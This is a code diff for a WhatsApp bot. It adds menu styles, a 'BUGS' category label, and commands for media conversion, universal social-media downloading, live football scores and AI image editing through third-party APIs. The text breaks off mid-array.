@@ -57,10 +57,21 @@ const CATEGORY_STYLE = {
   DOWNLOADER: '📥',
   'GROUP-ADMIN': '👥',
   'GROUP-SECURITY': '🛡️',
-  NSFW: '🔞'
+  NSFW: '🔞',
+  BUGS: '🐛'  // Added bugs category with bug emoji
 };
 
-const CATEGORY_ORDER = ['MAIN', 'AI', 'DOWNLOADER', 'INFO', 'TOOLS', 'GROUP-ADMIN', 'GROUP-SECURITY', 'NSFW'];
+const CATEGORY_ORDER = [
+  'MAIN', 
+  'AI', 
+  'DOWNLOADER', 
+  'INFO', 
+  'TOOLS', 
+  'GROUP-ADMIN', 
+  'GROUP-SECURITY', 
+  'NSFW', 
+  'BUGS'  // Added bugs category at the end
+];
 
 function greeting() {
   const h = new Date().getHours();
@@ -272,105 +283,95 @@ register({
 
 // -------------------- TO IMAGE --------------------
 register({
-  name: 'toimage',
-  aliases: ['img', 'toimg', 'convertimg'],
-  category: 'TOOLS',
-  description: 'Convert sticker to image and send to owner',
-  async execute({ sock, from, msg, quoted, prefix, command }) {
-    const target = quoted || msg;
-    const mime = target.mimetype || '';
-
-    // Use global PREFIX and command name as fallbacks
-    const cmdPrefix = prefix || PREFIX;
-    const cmdName = command || 'toimage';
-
-    if (!mime.includes('webp') && !mime.includes('sticker')) {
-      await sock.sendMessage(from, { text: `❌ Reply to a sticker with: ${cmdPrefix}${cmdName}` });
-      return;
-    }
-
-    await sock.sendMessage(from, { text: `⏳ Converting sticker to image...` });
-
-    try {
-      const mediaBuffer = await sock.downloadMediaMessage(target);
-      if (!mediaBuffer || mediaBuffer.length < 100) {
-        return await sock.sendMessage(from, { text: `❌ Failed to download sticker.` });
-      }
-
-      // Converts via ffmpeg-static (already a dependency, ships a prebuilt binary —
-      // no native compile step like `sharp` needs, which is what was breaking this
-      // command: sharp was never installed as a dependency).
-      const ffmpeg = require('ffmpeg-static');
-      const { exec } = require('child_process');
-      const fs = require('fs');
-      const path = require('path');
-
-      const tmpDir = path.join(process.cwd(), 'tmp');
-      if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
-
-      const inputPath = path.join(tmpDir, `sticker_${Date.now()}.webp`);
-      const outputPath = path.join(tmpDir, `image_${Date.now()}.jpg`);
-
-      fs.writeFileSync(inputPath, mediaBuffer);
-
-      let imageBuffer;
-      try {
-        await new Promise((resolve, reject) => {
-          exec(`"${ffmpeg}" -i "${inputPath}" "${outputPath}"`, (error) => {
-            if (error) reject(error);
-            else resolve();
-          });
-        });
-        imageBuffer = fs.readFileSync(outputPath);
-      } finally {
-        try { fs.unlinkSync(inputPath); } catch {}
-        try { fs.unlinkSync(outputPath); } catch {}
-      }
-
-      if (!imageBuffer || imageBuffer.length < 100) {
-        return await sock.sendMessage(from, { text: `❌ Failed to convert sticker.` });
-      }
-
-      const ownerJid = getOwnerJid(sock);
-      const caption = `🖼️ *Sticker to Image*\n📦 *Size:* ${(imageBuffer.length / 1024).toFixed(1)} KB`;
-
-      await sock.sendMessage(ownerJid, {
-        image: imageBuffer,
-        caption: caption
-      });
-
-      await sock.sendMessage(from, { 
-        text: `✅ Sticker converted and sent to owner's chat.\n📤 *Sent to:* ${ownerJid.split('@')[0]}` 
-      });
-
-    } catch (error) {
-      console.error('To image error:', error);
-      await sock.sendMessage(from, { text: `⚠️ Error: ${error.message || 'Could not convert sticker.'}` });
-    }
-  }
-});
-// -------------------- TO GIF --------------------
-register({
   name: 'togif',
   aliases: ['gif', 'togifconvert', 'makegif'],
   category: 'TOOLS',
   description: 'Convert sticker/video to GIF and send to owner',
   async execute({ sock, from, msg, quoted, prefix, command }) {
     const target = quoted || msg;
-    const mime = target.mimetype || '';
+    
+    // ==========================================================
+    // FIX: Better mime detection - check multiple locations
+    // ==========================================================
+    let mime = '';
+    let isSticker = false;
+    let isVideo = false;
+    let isGif = false;
+
+    // Check sticker message
+    if (target.message?.stickerMessage) {
+      mime = target.message.stickerMessage.mimetype || 'image/webp';
+      isSticker = true;
+    }
+    // Check video message
+    else if (target.message?.videoMessage) {
+      mime = target.message.videoMessage.mimetype || 'video/mp4';
+      isVideo = true;
+      // Check if it's a GIF
+      if (target.message.videoMessage.gifPlayback || mime.includes('gif')) {
+        isGif = true;
+      }
+    }
+    // Check image message (could be a webp sticker)
+    else if (target.message?.imageMessage) {
+      mime = target.message.imageMessage.mimetype || '';
+      if (mime.includes('webp')) isSticker = true;
+    }
+    // Check document message
+    else if (target.message?.documentMessage) {
+      mime = target.message.documentMessage.mimetype || '';
+      if (mime.includes('webp')) isSticker = true;
+    }
+    // Check quoted message
+    else if (quoted?.message?.stickerMessage) {
+      mime = quoted.message.stickerMessage.mimetype || 'image/webp';
+      isSticker = true;
+    }
+    else if (quoted?.message?.videoMessage) {
+      mime = quoted.message.videoMessage.mimetype || 'video/mp4';
+      isVideo = true;
+    }
+    // Fallback: check target.mimetype
+    else if (target.mimetype) {
+      mime = target.mimetype;
+      if (mime.includes('webp')) isSticker = true;
+      if (mime.includes('video')) isVideo = true;
+      if (mime.includes('gif')) isGif = true;
+    }
 
     const cmdPrefix = prefix || PREFIX;
     const cmdName = command || 'togif';
 
-    if (!mime.includes('webp') && !mime.includes('sticker') && !mime.includes('video') && !mime.includes('gif')) {
-      await sock.sendMessage(from, { text: `❌ Reply to a sticker or video with: ${cmdPrefix}${cmdName}` });
+    // Check if any valid media type was detected
+    if (!isSticker && !isVideo && !isGif && !mime.includes('webp') && !mime.includes('video')) {
+      await sock.sendMessage(from, { 
+        text: `❌ Reply to a *sticker* or *video* with: ${cmdPrefix}${cmdName}\n\nDetected: ${mime || 'unknown'}` 
+      });
       return;
     }
 
     await sock.sendMessage(from, { text: `⏳ Converting to GIF...` });
 
     try {
-      const mediaBuffer = await sock.downloadMediaMessage(target);
+      // ==========================================================
+      // FIX: Better download method
+      // ==========================================================
+      const { downloadMediaMessage } = require('@whiskeysockets/baileys');
+      
+      let mediaBuffer = null;
+      
+      try {
+        mediaBuffer = await downloadMediaMessage(
+          target.message || target,
+          'buffer',
+          {},
+          { reuploadRequest: sock.updateMediaMessage }
+        );
+      } catch (dlErr) {
+        // Fallback: try the old method
+        mediaBuffer = await sock.downloadMediaMessage(target);
+      }
+
       if (!mediaBuffer || mediaBuffer.length < 100) {
         return await sock.sendMessage(from, { text: `❌ Failed to download media.` });
       }
@@ -378,7 +379,10 @@ register({
       let gifBuffer = mediaBuffer;
       let isConverted = false;
 
-      if (mime.includes('webp') || mime.includes('sticker')) {
+      // ==========================================================
+      // Convert sticker/webp to GIF
+      // ==========================================================
+      if (isSticker || mime.includes('webp')) {
         try {
           const ffmpeg = require('ffmpeg-static');
           const { exec } = require('child_process');
@@ -409,7 +413,10 @@ register({
         }
       }
 
-      if (mime.includes('video') && !isConverted) {
+      // ==========================================================
+      // Convert video to GIF
+      // ==========================================================
+      if ((isVideo || mime.includes('video')) && !isConverted) {
         try {
           const ffmpeg = require('ffmpeg-static');
           const { exec } = require('child_process');
@@ -583,7 +590,7 @@ register({
 });
 // ---------- MAIN ----------
 
-const MENU_STYLES = ['classic', 'compact', 'minimal'];
+const MENU_STYLES = ['classic', 'compact', 'minimal', 'neon', 'elegant'];
 
 function buildMenu(style, { commandPrefix, name, isGroup }) {
   const byCategory = {};
@@ -611,6 +618,60 @@ function buildMenu(style, { commandPrefix, name, isGroup }) {
     menu += `_${BOT_NAME}_`;
     return menu;
   }
+  
+  // ---- neon: bold, high-contrast, cyberpunk feel ----
+  if (style === 'neon') {
+    let menu = '';
+    menu += `『 🌌 *${BOT_NAME}* 』\n`;
+    menu += `▸ ${greeting()}, *${name}* ⚡\n`;
+    menu += `▸ 📅 ${date}\n`;
+    menu += `▸ ⏱️ Uptime   ➤ ${uptime}\n`;
+    menu += `▸ ⚙️ Prefix   ➤ [ ${commandPrefix} ]\n`;
+    menu += `▸ 📦 Commands ➤ ${totalCommands}\n`;
+    menu += `▸ 🌐 Mode     ➤ ${isGroup ? 'Group' : 'Private'}\n`;
+    menu += `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n`;
+
+    for (const cat of orderedCats) {
+      const names = byCategory[cat];
+      const icon = CATEGORY_STYLE[cat] || '📁';
+      menu += `『 ${icon} *${cat}* 』\n`;
+      names.forEach((n) => {
+        menu += `  ➤ ${commandPrefix}${n}\n`;
+      });
+      menu += `\n`;
+    }
+
+    menu += `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n⚡ _${BOT_NAME} · never sleeps_ ⚡`;
+    return menu;
+  }
+  
+  // ---- elegant: refined, airy, minimal ornamentation ----
+  if (style === 'elegant') {
+    let menu = '';
+    menu += `┌ ✦ *${BOT_NAME}* ✦\n`;
+    menu += `│  ${greeting()}, *${name}*\n`;
+    menu += `│  ${date}\n`;
+    menu += `└───────────────\n`;
+    menu += `   ⏱ Uptime   · ${uptime}\n`;
+    menu += `   ⚙ Prefix   · [ ${commandPrefix} ]\n`;
+    menu += `   📦 Commands · ${totalCommands}\n`;
+    menu += `   🌐 Mode     · ${isGroup ? 'Group' : 'Private'}\n\n`;
+
+    for (const cat of orderedCats) {
+      const names = byCategory[cat];
+      const icon = CATEGORY_STYLE[cat] || '📁';
+      menu += `✦ ${icon} *${cat}*\n`;
+      names.forEach((n) => {
+        menu += `   · ${commandPrefix}${n}\n`;
+      });
+      menu += `\n`;
+    }
+
+    menu += `─────────────\n✦ _${BOT_NAME}_ ✦`;
+    return menu;
+  }
+  
+  
 
   // ---- compact: flat numbered list, one line per category header ----
   if (style === 'compact') {
@@ -3242,6 +3303,240 @@ register({
   }
 });
 register({
+  name: 'all',
+  aliases: ['alldl', 'allmedia', 'downloadall'],
+  category: 'DOWNLOADER',
+  description: 'Download media from TikTok, Twitter, Facebook, Instagram, Pinterest, LinkedIn, Snapchat, Threads, Tumblr',
+  async execute({ sock, from, args, prefix, command }) {
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `📥 *Universal Media Downloader*\n\nUsage: ${prefix}${command} <url>\nExample: ${prefix}${command} https://www.tiktok.com/@user/video/xxxxx\n\n*Supported Platforms:*\n• TikTok\n• Twitter/X\n• Facebook\n• Instagram\n• Pinterest\n• LinkedIn\n• Snapchat\n• Threads\n• Tumblr\n\n*Note:* Automatically detects media type and sends accordingly.`
+      });
+    }
+
+    const url = args[0];
+    await sock.sendMessage(from, { text: `⏳ Processing media from URL...` });
+
+    try {
+      // ==========================================================
+      // Primary: OmegaTech All-Downloader-V2
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const response = await fetch(
+        `${baseUrl}/api/download/All-downloader-v2?url=${encodeURIComponent(url)}`,
+        {
+          headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json'
+          }
+        }
+      );
+
+      if (!response.ok) {
+        throw new Error(`API returned ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Extract media URLs from response
+      // ==========================================================
+      let videoUrl = data.result?.video || data.result?.download_url || 
+                     data.video || data.download_url || data.url;
+      
+      let imageUrls = data.result?.images || data.images || 
+                      data.result?.urls || data.urls || [];
+      
+      let audioUrl = data.result?.audio || data.audio || 
+                     data.result?.music || data.music;
+      
+      let title = data.result?.title || data.title || data.caption || 'Media';
+      let author = data.result?.author || data.author || data.username || 'Unknown';
+      let thumbnail = data.result?.thumbnail || data.thumbnail || data.cover || null;
+      let duration = data.result?.duration || data.duration || 'N/A';
+      let platform = data.result?.platform || data.platform || 'Unknown';
+
+      // ==========================================================
+      // Fallback: Search for any URL in the response
+      // ==========================================================
+      if (!videoUrl && !imageUrls.length && !audioUrl) {
+        const jsonString = JSON.stringify(data);
+        
+        // Look for video URLs
+        const videoMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mov|webm|mkv|avi)/i);
+        if (videoMatch) videoUrl = videoMatch[0];
+        
+        // Look for audio URLs
+        const audioMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp3|m4a|ogg|wav|aac)/i);
+        if (audioMatch) audioUrl = audioMatch[0];
+        
+        // Look for image URLs
+        const imageMatch = jsonString.match(/https?:\/\/[^\s"']+\.(jpg|jpeg|png|gif|webp)/gi);
+        if (imageMatch && imageMatch.length) imageUrls = imageMatch;
+      }
+
+      if (!videoUrl && !imageUrls.length && !audioUrl) {
+        throw new Error("Could not extract media from the provided URL.");
+      }
+
+      // ==========================================================
+      // Send thumbnail if available
+      // ==========================================================
+      if (thumbnail) {
+        try {
+          await sock.sendMessage(from, {
+            image: { url: thumbnail },
+            caption: `📥 *${platform} Media*\n📝 *Title:* ${title}\n👤 *Author:* ${author}\n⏱️ *Duration:* ${duration}\n\n⬇️ *Downloading media...*`
+          });
+        } catch (thumbErr) {
+          // Continue without thumbnail
+        }
+      }
+
+      // ==========================================================
+      // Send media
+      // ==========================================================
+      let sentCount = 0;
+
+      // Send video if available
+      if (videoUrl) {
+        try {
+          const videoResponse = await fetch(videoUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (videoResponse.ok) {
+            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
+            if (videoBuffer.length > 5000) {
+              const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);
+
+              // If video is too large, send as document
+              if (videoBuffer.length > 16 * 1024 * 1024) {
+                await sock.sendMessage(from, {
+                  document: videoBuffer,
+                  mimetype: 'video/mp4',
+                  fileName: `${title.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.mp4`,
+                  caption: `📥 *${platform} Video*\n📝 *Title:* ${title}\n👤 *Author:* ${author}\n📦 *Size:* ${fileSizeMB} MB\n\n⚠️ *Sent as document due to WhatsApp 16MB limit.*`
+                });
+              } else {
+                await sock.sendMessage(from, {
+                  video: videoBuffer,
+                  mimetype: 'video/mp4',
+                  caption: `📥 *${platform} Video*\n📝 *Title:* ${title}\n👤 *Author:* ${author}\n📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success*`
+                });
+              }
+              sentCount++;
+            }
+          }
+        } catch (vidErr) {
+          console.warn('Video download failed:', vidErr.message);
+        }
+      }
+
+      // Send audio if available (and no video sent)
+      if (audioUrl && sentCount === 0) {
+        try {
+          const audioResponse = await fetch(audioUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (audioResponse.ok) {
+            const audioBuffer = Buffer.from(await audioResponse.arrayBuffer());
+            if (audioBuffer.length > 5000) {
+              const fileSizeMB = (audioBuffer.length / 1024 / 1024).toFixed(1);
+              await sock.sendMessage(from, {
+                audio: audioBuffer,
+                mimetype: 'audio/mpeg',
+                fileName: `${title.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.mp3`,
+                caption: `🎵 *${platform} Audio*\n📝 *Title:* ${title}\n👤 *Author:* ${author}\n📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success*`
+              });
+              sentCount++;
+            }
+          }
+        } catch (audErr) {
+          console.warn('Audio download failed:', audErr.message);
+        }
+      }
+
+      // Send images if available
+      if (imageUrls.length && sentCount === 0) {
+        const maxImages = Math.min(imageUrls.length, 10);
+        for (let i = 0; i < maxImages; i++) {
+          try {
+            const imgUrl = imageUrls[i];
+            if (imgUrl && imgUrl.startsWith('http')) {
+              const imgResponse = await fetch(imgUrl);
+              if (imgResponse.ok) {
+                const imgBuffer = Buffer.from(await imgResponse.arrayBuffer());
+                if (imgBuffer.length > 1000) {
+                  await sock.sendMessage(from, {
+                    image: imgBuffer,
+                    caption: i === 0 ? `📸 *${platform} Images*\n📝 *Title:* ${title}\n👤 *Author:* ${author}\n📷 ${i+1}/${maxImages}` : `📷 ${i+1}/${maxImages}`
+                  });
+                  sentCount++;
+                  await new Promise(r => setTimeout(r, 500));
+                }
+              }
+            }
+          } catch (imgErr) {
+            console.warn(`Image ${i+1} failed:`, imgErr.message);
+          }
+        }
+      }
+
+      if (sentCount === 0) {
+        throw new Error("Failed to download any media from the provided URL.");
+      }
+
+    } catch (error) {
+      console.error('Universal download error:', error);
+
+      // ==========================================================
+      // Fallback: Try platform-specific endpoints
+      // ==========================================================
+      const fallbackEndpoints = [
+        { name: 'OmegaTech', url: `https://omegatech-api.dixonomega.tech/api/download/All-downloader-v2?url=${encodeURIComponent(url)}` },
+        { name: 'Prince', url: `https://api.princetechn.com/api/download/all?apikey=prince&url=${encodeURIComponent(url)}` },
+        { name: 'GiftedTech', url: `https://api.giftedtech.co.ke/api/download/media?apikey=gifted&url=${encodeURIComponent(url)}` }
+      ];
+
+      for (const endpoint of fallbackEndpoints) {
+        try {
+          const fallbackRes = await fetch(endpoint.url, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (fallbackRes.ok) {
+            const fallbackData = await fallbackRes.json();
+            let fallbackMedia = fallbackData.result?.url || fallbackData.result?.download_url || 
+                               fallbackData.url || fallbackData.download_url || fallbackData.result;
+
+            if (fallbackMedia && fallbackMedia.startsWith('http')) {
+              const mediaRes = await fetch(fallbackMedia);
+              const mediaBuf = Buffer.from(await mediaRes.arrayBuffer());
+              if (mediaBuf.length > 5000) {
+                await sock.sendMessage(from, {
+                  video: mediaBuf,
+                  mimetype: 'video/mp4',
+                  caption: `📥 *Media (${endpoint.name} fallback)*\n\n✅ *Download Success*`
+                });
+                return;
+              }
+            }
+          }
+        } catch (fallbackErr) {
+          console.warn(`${endpoint.name} fallback failed:`, fallbackErr.message);
+        }
+      }
+
+      await sock.sendMessage(from, { 
+        text: `⚠️ Download Error: ${error.message || 'Could not download media.'}\n\n💡 Make sure:\n• The URL is valid and public\n• The platform is supported\n• Try a direct video/link\n\n*Supported:* TikTok, Twitter, Facebook, Instagram, Pinterest, LinkedIn, Snapchat, Threads, Tumblr` 
+      });
+    }
+  }
+});
+
+register({
   name: 'livescore',
   aliases: ['score', 'football', 'scores', 'livefootball'],
   category: 'INFO',
@@ -3444,6 +3739,2599 @@ register({
 
       await sock.sendMessage(from, { 
         text: `⚠️ Neko Error: ${error.message || 'Could not fetch image.'}\n\n💡 Try again later.` 
+      });
+    }
+  }
+});
+register({
+  name: 'scores',
+  aliases: ['livescore', 'football', 'matches', 'livefootball'],
+  category: 'INFO',
+  description: 'Fetch live football matches and scores',
+  async execute({ sock, from, args, prefix, command }) {
+    // Check if user wants to filter by league or team
+    let filter = '';
+    if (args[0]) {
+      filter = args.join(' ').toLowerCase();
+    }
+
+    await sock.sendMessage(from, { text: `⏳ Fetching live football scores...` });
+
+    try {
+      // ==========================================================
+      // Primary: OmegaTech API - /api/tools/scores
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const response = await fetch(`${baseUrl}/api/tools/scores`, {
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'application/json'
+        }
+      });
+
+      if (!response.ok) {
+        throw new Error(`API returned ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Extract matches from response
+      // ==========================================================
+      let matches = data.result?.matches || data.matches || data.data || [];
+      let totalMatches = matches.length || data.total || data.count || 0;
+
+      // Handle case where data might be an object with matches inside
+      if (data.result && !Array.isArray(data.result)) {
+        matches = data.result.matches || data.result.fixtures || data.result.data || [];
+      }
+
+      if (!matches || !Array.isArray(matches) || matches.length === 0) {
+        return await sock.sendMessage(from, { 
+          text: `⚽ No live matches found right now.\n\n💡 Check back later or try:\n${prefix}${command} premier league\n${prefix}${command} la liga\n${prefix}${command} champions league` 
+        });
+      }
+
+      // ==========================================================
+      // Apply filter if specified
+      // ==========================================================
+      if (filter) {
+        const filtered = matches.filter(m => {
+          const league = (m.league || m.competition || m.tournament || '').toLowerCase();
+          const home = (m.homeTeam || m.home || m.team1 || '').toLowerCase();
+          const away = (m.awayTeam || m.away || m.team2 || '').toLowerCase();
+          return league.includes(filter) || home.includes(filter) || away.includes(filter);
+        });
+        
+        if (filtered.length === 0) {
+          return await sock.sendMessage(from, { 
+            text: `❌ No matches found for "${filter}".\n\n💡 Try a different filter or remove it.\n\n*Examples:*\n${prefix}${command} premier league\n${prefix}${command} manchester\n${prefix}${command} champions` 
+          });
+        }
+        matches = filtered;
+        totalMatches = matches.length;
+      }
+
+      // ==========================================================
+      // Limit to 20 matches to avoid message overflow
+      // ==========================================================
+      const maxMatches = Math.min(matches.length, 25);
+
+      // ==========================================================
+      // Build the response
+      // ==========================================================
+      let msg = `⚽ *LIVE FOOTBALL SCORES*\n`;
+      if (filter) msg += `📌 *Filter:* ${filter}\n`;
+      msg += `📊 *Showing:* ${maxMatches}/${matches.length} matches\n`;
+      msg += `🕐 *Updated:* ${new Date().toLocaleString()}\n\n`;
+
+      let matchCount = 0;
+      for (const match of matches) {
+        if (matchCount >= maxMatches) break;
+        
+        // Extract match data with fallbacks
+        const home = match.homeTeam || match.home || match.team1 || 'Unknown';
+        const away = match.awayTeam || match.away || match.team2 || 'Unknown';
+        const homeScore = match.homeScore !== undefined ? match.homeScore : (match.score?.home || match.score1 || '?');
+        const awayScore = match.awayScore !== undefined ? match.awayScore : (match.score?.away || match.score2 || '?');
+        const league = match.league || match.competition || match.tournament || 'Unknown League';
+        const status = match.status || match.matchStatus || match.time || 'Unknown';
+        const startTime = match.startTime || match.kickoff || match.datetime || '';
+
+        // Format time
+        let timeDisplay = '';
+        if (startTime) {
+          try {
+            const date = new Date(startTime);
+            if (!isNaN(date)) {
+              timeDisplay = date.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+            }
+          } catch (e) {}
+        }
+
+        // Status emoji
+        let statusEmoji = '⏳';
+        const statusLower = (status || '').toLowerCase();
+        if (statusLower.includes('full time') || statusLower.includes('ft') || statusLower.includes('finished')) {
+          statusEmoji = '✅ FT';
+        } else if (statusLower.includes('live') || statusLower.includes('in progress') || statusLower.includes('playing')) {
+          statusEmoji = '🟢 LIVE';
+        } else if (statusLower.includes('half time') || statusLower.includes('ht')) {
+          statusEmoji = '⏸️ HT';
+        } else if (statusLower.includes('scheduled') || statusLower.includes('upcoming')) {
+          statusEmoji = '📅';
+        } else if (statusLower.includes('penalty') || statusLower.includes('pen')) {
+          statusEmoji = '⚽ PEN';
+        }
+
+        // Format score display
+        let scoreDisplay = `${homeScore} - ${awayScore}`;
+        if (homeScore === '?' || awayScore === '?') {
+          scoreDisplay = 'vs';
+        }
+
+        msg += `${statusEmoji} *${league}*\n`;
+        msg += `🏠 ${home} ${scoreDisplay} ${away}\n`;
+        if (timeDisplay) msg += `🕐 ${timeDisplay}`;
+        if (status && !statusLower.includes('live')) msg += ` | ${status}`;
+        msg += `\n\n`;
+
+        matchCount++;
+      }
+
+      if (matches.length > 25) {
+        msg += `\n*Showing 25 of ${matches.length} matches.*\n`;
+        msg += `💡 Use ${prefix}${command} <league/team> to filter results.`;
+      }
+
+      // ==========================================================
+      // Send the message
+      // ==========================================================
+      await sock.sendMessage(from, { text: msg });
+
+    } catch (error) {
+      console.error('Scores error:', error);
+
+      // ==========================================================
+      // Fallback: Try alternative endpoints
+      // ==========================================================
+      const fallbacks = [
+        'https://api.giftedtech.co.ke/api/football/livescore2?apikey=gifted',
+        'https://api.princetechn.com/api/tools/scores?apikey=prince',
+        'https://apis.davidcyril.name.ng/sports/football'
+      ];
+
+      for (const fallbackUrl of fallbacks) {
+        try {
+          const fallbackRes = await fetch(fallbackUrl, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (fallbackRes.ok) {
+            const fallbackData = await fallbackRes.json();
+            let fallbackMatches = fallbackData.result?.matches || 
+                                 fallbackData.matches || 
+                                 fallbackData.data || 
+                                 fallbackData.fixtures || [];
+
+            if (fallbackMatches && fallbackMatches.length > 0) {
+              let msg = `⚽ *Live Scores (fallback)*\n\n`;
+              const filtered = filter ? fallbackMatches.filter(m => {
+                const league = (m.league || m.competition || '').toLowerCase();
+                const home = (m.homeTeam || m.home || '').toLowerCase();
+                const away = (m.awayTeam || m.away || '').toLowerCase();
+                return league.includes(filter) || home.includes(filter) || away.includes(filter);
+              }) : fallbackMatches;
+
+              const display = (filter && filtered.length > 0) ? filtered : fallbackMatches;
+              const limit = Math.min(display.length, 15);
+
+              for (let i = 0; i < limit; i++) {
+                const m = display[i];
+                const home = m.homeTeam || m.home || 'Unknown';
+                const away = m.awayTeam || m.away || 'Unknown';
+                const score = m.score || `${m.homeScore || 0} - ${m.awayScore || 0}`;
+                const league = m.league || m.competition || 'Unknown League';
+                msg += `*${league}*\n${home} ${score} ${away}\n\n`;
+              }
+
+              if (filter && filtered.length === 0) {
+                msg = `❌ No matches found for "${filter}". Try a different filter.`;
+              }
+
+              return await sock.sendMessage(from, { text: msg });
+            }
+          }
+        } catch (fallbackErr) {
+          console.warn(`Fallback ${fallbackUrl} failed:`, fallbackErr.message);
+        }
+      }
+
+      // ==========================================================
+      // All fallbacks failed
+      // ==========================================================
+      await sock.sendMessage(from, { 
+        text: `⚠️ Could not fetch live scores: ${error.message || 'Unknown error'}\n\n💡 Try:\n• ${prefix}${command} premier league\n• ${prefix}${command} la liga\n• ${prefix}${command} manchester united\n\n💡 Or try again in a few minutes.` 
+      });
+    }
+  }
+});
+register({
+  name: 'nanobanana',
+  aliases: ['bananaai', 'editimage', 'imgtransform', 'nanobanana2', 'aiedit'],
+  category: 'AI',
+  description: 'Transform an image using AI Banana (nano-banana-2) with a prompt',
+  async execute({ sock, from, msg, quoted, args, prefix, command }) {
+    // ==========================================================
+    // Check if user provided a prompt
+    // ==========================================================
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `🍌 *AI Banana Image Editor*\n\nUsage: ${prefix}${command} <prompt> (reply to an image)\nExample: ${prefix}${command} make it black and white\n\n*Examples:*\n${prefix}${command} turn this into a cartoon\n${prefix}${command} add a sunset background\n${prefix}${command} make this look like an oil painting\n${prefix}${command} remove the background\n\n*Note:* Reply to an image message with your prompt.` 
+      });
+    }
+
+    const prompt = args.join(" ");
+    const target = quoted || msg;
+
+    // ==========================================================
+    // Check if replying to an image
+    // ==========================================================
+    let imageUrl = null;
+    let imageBuffer = null;
+
+    // Check for image in quoted message
+    if (quoted?.message?.imageMessage) {
+      imageUrl = quoted.message.imageMessage.url || quoted.message.imageMessage.caption;
+    } else if (msg?.message?.imageMessage) {
+      imageUrl = msg.message.imageMessage.url || msg.message.imageMessage.caption;
+    } else if (quoted?.message?.documentMessage?.mimetype?.includes('image')) {
+      imageUrl = quoted.message.documentMessage.url;
+    }
+
+    if (!imageUrl) {
+      return await sock.sendMessage(from, { 
+        text: `❌ Reply to an *image* with: ${prefix}${command} <prompt>\n\nExample: Reply to a photo with:\n${prefix}${command} make it look like a painting` 
+      });
+    }
+
+    await sock.sendMessage(from, { text: `🍌 *AI Banana processing...*\n⏳ Editing image with prompt: *${prompt}*\n\nThis may take 10-20 seconds...` });
+
+    try {
+      // ==========================================================
+      // Call OmegaTech AI Banana API
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const response = await fetch(`${baseUrl}/api/ai/ai-nanobanana`, {
+        method: 'POST',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          prompt: prompt,
+          image: imageUrl
+        })
+      });
+
+      if (!response.ok) {
+        throw new Error(`API returned ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Extract generated image URL
+      // ==========================================================
+      let resultImage = data.result?.url || data.result?.image || data.result?.generated || 
+                        data.url || data.image || data.generated || data.output;
+
+      if (!resultImage) {
+        // Try to find any URL in the response
+        const jsonString = JSON.stringify(data);
+        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(png|jpg|jpeg|gif|webp)/i);
+        if (urlMatch) resultImage = urlMatch[0];
+      }
+
+      if (!resultImage) {
+        throw new Error("Could not extract generated image from API response.");
+      }
+
+      // ==========================================================
+      // Download and send the result
+      // ==========================================================
+      const imageResponse = await fetch(resultImage, {
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+      });
+
+      if (!imageResponse.ok) {
+        throw new Error(`Failed to download result: ${imageResponse.status}`);
+      }
+
+      const imageBuffer = Buffer.from(await imageResponse.arrayBuffer());
+
+      if (imageBuffer.length < 1000) {
+        throw new Error("Generated image is too small, possibly corrupted.");
+      }
+
+      const fileSize = (imageBuffer.length / 1024).toFixed(1);
+
+      // ==========================================================
+      // Send the generated image
+      // ==========================================================
+      await sock.sendMessage(from, {
+        image: imageBuffer,
+        caption: `🍌 *AI Banana Transform*\n\n📝 *Prompt:* ${prompt}\n📦 *Size:* ${fileSize} KB\n\n✅ *Image Generated Successfully*\n\n✨ _Powered by OmegaTech AI_`
+      });
+
+    } catch (error) {
+      console.error('AI Banana error:', error);
+
+      // ==========================================================
+      // Fallback: Try alternative endpoints
+      // ==========================================================
+      const fallbacks = [
+        {
+          url: `https://api.princetechn.com/api/ai/imagegen?apikey=prince&prompt=${encodeURIComponent(prompt)}&image=${encodeURIComponent(imageUrl)}`,
+          name: 'Prince'
+        },
+        {
+          url: `https://apis.davidcyril.name.ng/imagegen/edit?prompt=${encodeURIComponent(prompt)}&image=${encodeURIComponent(imageUrl)}`,
+          name: 'David Cyril'
+        },
+        {
